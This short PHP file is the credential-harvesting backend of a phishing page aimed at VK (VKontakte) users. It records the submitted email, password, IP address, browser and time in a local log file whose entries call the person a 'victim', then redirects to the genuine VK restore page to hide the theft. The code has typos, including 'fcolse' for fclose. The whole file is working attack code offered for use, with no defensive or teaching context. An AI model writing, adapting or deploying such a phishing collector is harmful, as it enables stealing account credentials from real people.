<?php
$date = date("Y/m/d");
$time = date("h:i:sa");
header('Location: https://vk.com/restore/');
$vk_usern = $_POST['email'] ;
$vk_pass =  $_POST['pass'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$client_ip =  $_SERVER['HTTP_CLIENT_IP'];
$file = fopen("vk_thite_log.txt","a");
fwrite($file,"victiun ip :$client_ip \n");  
fwrite($file,"victum browse : $browser \nusername : $vk_usern \n");
fwrite($file,"password : $vk_pass \n");
fwrite($file,"login time : \n  date : $date \n  time : $time \n################################ \n");
fcolse($file);

?>
